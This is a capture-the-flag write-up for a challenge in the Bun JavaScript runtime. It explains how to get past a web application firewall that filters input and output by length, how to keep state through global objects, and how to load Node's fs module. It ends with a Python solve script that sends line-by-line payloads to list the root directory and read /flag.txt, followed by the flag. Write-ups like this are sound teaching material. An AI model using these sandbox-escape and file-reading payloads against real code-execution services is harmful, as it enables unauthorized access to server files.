---
ai_date: '2025-04-27 05:15:00'
ai_summary: Bypassed WAF with input/output length restriction, used persistent prototype
  pollution, and leveraged async execution by bypassing Bun functions.
ai_tags:
- waf-bypass
- prototype-pollution
- async-exec
created: 2024-07-27T20:24
description: Easiest ever RCE
points: 400
solves: 11
tags:
- bun
updated: 2024-07-28T04:21
---

> I’ve created a super secure sinkless buntime, is it really secure?

## Analysis

### Bypass WAF

I tried using `Bun.file` etc to spawn shells but always encounter this weird error.

`WAF: Output Not allowed` or `WAF: Input Not allowed`.

I am not sure what caused them as they block innocent stuff but let others pass.

```js
/*eval*/
throw new Error(JSON.stringify(Bun.env))
// this fails

/*eval*/
// this runs

throw new Error(JSON.stringify(Bun.env))
// this runs

eval("1+1")
// this also runs
```

Eventually I realized that it worked on length, if input or output is longer than a set amount it will fail.

For input, I found it via comments.

```js
///////////////////////////////////////////////////    <- will fail
//////////////////////////////////////////////////     <- will work
```

For output, we can use `throw new Error(str)` to bypass the output restriction.

### Persistence

When trying to prototype pollute the server, I realized that my prototype pollutions are preserved.

This means that I am running code in the same context, that's good as I can store info in `global`. And don't have to somehow compress everything in one payload.
### Sync / Async

For some reason, await just wouldn't work at all.
So I decided to ditch Bun's functions and use node.js defaults. The `fs` module.

## Solve Script

IDK if the async import will cause the next lines to break, but since their effects persist, you can just run the script twice.

```python
import requests


def string_to_hex(s):
    return ''.join(f'\\x{ord(c):02x}' for c in s)


payload = """
///////////////////////////////////////////////////
import("fs").then(fs=>global.fs=fs)
throw new Error(global.fs.readdirSync("/"))
global.flag=global.fs.readFileSync("/flag.txt")
throw new Error(global.flag)
""".strip()

print(payload)
print()
for l in payload.splitlines():
    r = requests.post("https://8dd1742bbfecae1ec5685380.deadsec.quest/run", json={"code": l})
    print(r.text)

"""
bun 1.1.20 (later than latest version but not related to the challenge)
"""
```

```flag
DEAD{BunT1m3_Fun_T1m3_Y0u_C4n_4lw4y$_Run_4$ync_1n$1d3_$ync}
```